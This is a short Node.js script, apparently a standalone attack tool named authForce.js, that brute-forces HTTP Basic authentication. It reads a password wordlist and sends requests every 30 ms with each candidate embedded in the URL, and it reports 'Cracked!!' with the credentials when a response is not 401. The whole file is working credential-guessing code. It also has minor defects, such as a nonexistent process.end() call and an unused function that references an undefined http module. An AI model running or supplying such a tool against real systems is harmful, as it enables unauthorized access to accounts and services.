#!/usr/bin/env node
// jesus.olmos@blueliv.com

var request = require('request');
var fs = require('fs');
var port = 80;

function usage() {
	console.log('./authForce.js [host] [path] [user] [wordlist]');
	process.exit();
}

function main() {
	if (process.argv.length != 6)
		usage();
	
	var host = process.argv[2];
	var path = process.argv[3];
	var user = process.argv[4];
	var wordlist = process.argv[5];
	load(wordlist, connect.bind(null,host,path,user));
    console.log('Bruteforcing ...');
}

function connect(host,path,user,pwd) {
	var url = 'http://'+user+':'+pwd+'@'+host+path;
	//console.log(url);
	
	request({url:url}, function(err,resp,body) {
		if (!err)
            if (resp.statusCode != 401) {
                console.log('Cracked!! http://%s%s     user:%s   pass:%s',host,path,user,pwd);
                process.end();
            }
	});
}

function load(file,callback) {
	fs.readFile(file,function(err,data) {
		data = data.toString().split('\n');
		paralelizer(data,callback); 
	});
}

function paralelizer(array, callback) {
    var a = array.concat();

        setTimeout(function() {
                callback(a.shift());
                if (a.length>0)
                        setTimeout(arguments.callee,30);
        },30);
}

function connect_http(host,path,user,pwd) {
    pwd = pwd.replace('@','%40').replace('/','%2f');

	var opts = {
		port: port,
		host: host,
		path: path,
		method: 'GET',
		headers: {
        	"Proxy-Authorization": basicHash(user,pwd),
       		Host: host,
 		}
	}

	var req = http.request(opts,function(resp) {
		var html = '';
		resp.on('data',function(chunk) {
			html += chunk;
		});
		resp.on('end', function() {
			console.log(html);
		});
	});
	req.on('error', function(err) {
		console.log('err: '+err);
	});
	req.end();
}

function basicHash(user,pwd) {
	return 'Basic ' + new Buffer(user + ':' + pwd).toString('base64');
}

main();
